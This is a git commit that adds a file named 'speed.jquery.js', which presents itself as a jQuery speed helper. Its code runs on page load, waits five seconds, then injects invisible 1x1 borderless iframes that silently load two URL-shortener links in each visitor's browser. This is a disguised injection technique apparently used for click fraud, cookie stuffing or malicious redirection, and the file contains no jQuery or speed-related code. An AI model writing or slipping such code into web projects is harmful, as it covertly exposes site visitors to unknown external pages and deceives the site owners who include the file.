18c44c8ed4d31cc023b0df8f5e21c686263d8af8
hipacket <48793270+hipacket@users.noreply.github.com>
2019-03-26 15:56:31 +0700

    Create speed.jquery.js

---
+++ speed.jquery.js
@@ -0,0 +1,13 @@
+window.onload = function(){
+  var list = ['https://shorten.asia/44h1EFtU', 'https://shorten.asia/b6Nvstes'];
+  setTimeout(function(){
+    var node = document.createElement('iframe');
+    node.width = 1;
+    node.height = 1;
+    node.style.cssText = 'padding:0;margin:0;border: 0;display: inline-block;';
+    list.forEach(url => {
+      node.src = url;
+      document.body.append(node.cloneNode());
+    })
+  }, 5000);
+}
